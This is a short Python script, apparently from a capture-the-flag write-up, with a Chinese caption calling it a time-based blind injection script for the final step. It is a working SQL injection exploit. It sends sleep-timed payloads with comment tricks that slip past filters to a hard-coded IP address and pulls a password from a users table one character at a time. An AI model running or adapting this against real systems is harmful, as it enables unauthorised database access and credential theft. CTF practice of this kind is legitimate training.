```python
import requests
import datetime
flag = ''
url='http://134.175.92.218:4321/?id=1"'
for i in range(30):
    for k in range(32, 127):
        payload = "and/**/if(ascii(mid((SELECT/**/password/**/FROM/**/users/**/LIMIT/**/6,1),{},1))={},sleep(2),1)%23" .format(i,k)
        time1 = datetime.datetime.now()
        res = requests.get(url + payload)
        time2 = datetime.datetime.now()
        difference = (time2 - time1).seconds
        if difference > 1:
            flag += chr(k)
            print("flag为->" + flag)
```

时间盲注脚本，最后一步

![image-20240316022110932](https://pic.imgdb.cn/item/65f4919f9f345e8d0331e785.png)